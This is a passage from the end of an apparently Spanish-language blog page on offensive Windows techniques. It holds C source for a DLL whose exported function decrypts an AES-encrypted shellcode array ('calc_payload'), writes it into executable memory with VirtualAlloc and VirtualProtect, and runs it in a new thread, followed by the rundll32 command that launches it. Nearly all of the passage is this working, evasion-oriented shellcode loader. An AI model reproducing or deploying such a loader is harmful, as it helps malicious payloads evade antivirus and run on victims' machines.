class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">calc_payload</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span> <span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>La ejecución del proceso:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe base_injection_exec.dll,f0ns1
</code></pre></div></div>
<p><img src="/assets/images/aes_dll_encryption.png" alt="xor_dll_encription" /></p>

<p><a href="./">back</a></p>

      </section>
    </div>
  </body>
</html>
